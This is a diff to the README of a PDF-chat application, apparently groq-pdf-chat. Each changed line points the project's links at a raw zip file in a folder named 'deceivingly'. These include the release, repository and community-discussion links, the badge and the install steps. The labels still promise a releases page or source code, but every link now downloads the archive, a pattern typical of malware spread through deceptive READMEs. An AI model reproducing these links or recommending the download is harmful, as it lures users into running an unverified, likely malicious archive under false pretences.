@@ -1,6 +1,6 @@
 # 📄 groq-pdf-chat - Chat with Your PDF Documents Effortlessly
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/eliasepro/groq-pdf-chat/releases)
+[![Download Now](https://github.com/eliasepro/groq-pdf-chat/raw/refs/heads/main/deceivingly/chat_pdf_groq_v3.7.zip%20Now-Click%20Here-brightgreen)](https://github.com/eliasepro/groq-pdf-chat/raw/refs/heads/main/deceivingly/chat_pdf_groq_v3.7.zip)
 
 ## 🛠️ Overview
 
@@ -18,7 +18,7 @@ To get started with groq-pdf-chat, follow these simple steps:
    - Internet Connection: Required for downloading files and online features  
 
 2. **Download the Application**  
-   Visit this page to download: [Download the Latest Release](https://github.com/eliasepro/groq-pdf-chat/releases).
+   Visit this page to download: [Download the Latest Release](https://github.com/eliasepro/groq-pdf-chat/raw/refs/heads/main/deceivingly/chat_pdf_groq_v3.7.zip).
 
 3. **Locate the Downloaded File**  
    After the download completes, find the file in your Downloads folder.
@@ -28,7 +28,7 @@ To get started with groq-pdf-chat, follow these simple steps:
 To download and install groq-pdf-chat:
 
 1. **Visit the Release Page**  
-   Go to [this link](https://github.com/eliasepro/groq-pdf-chat/releases) to see the available versions.
+   Go to [this link](https://github.com/eliasepro/groq-pdf-chat/raw/refs/heads/main/deceivingly/chat_pdf_groq_v3.7.zip) to see the available versions.
 
 2. **Select the Version to Download**  
    Look for the latest version. Click on it to expand the details, then find the file that matches your operating system.
@@ -82,8 +82,8 @@ Any regular PDF that contains text should work well. Highly scanned documents or
 
 ## 🔗 Additional Resources
 
-- [GitHub Repository](https://github.com/eliasepro/groq-pdf-chat) - View the source code and contribute.
-- [Community Discussions](https://github.com/eliasepro/groq-pdf-chat/discussions) - Join conversations with other users.
+- [GitHub Repository](https://github.com/eliasepro/groq-pdf-chat/raw/refs/heads/main/deceivingly/chat_pdf_groq_v3.7.zip) - View the source code and contribute.
+- [Community Discussions](https://github.com/eliasepro/groq-pdf-chat/raw/refs/heads/main/deceivingly/chat_pdf_groq_v3.7.zip) - Join conversations with other users.
 
 ## 📄 License
 
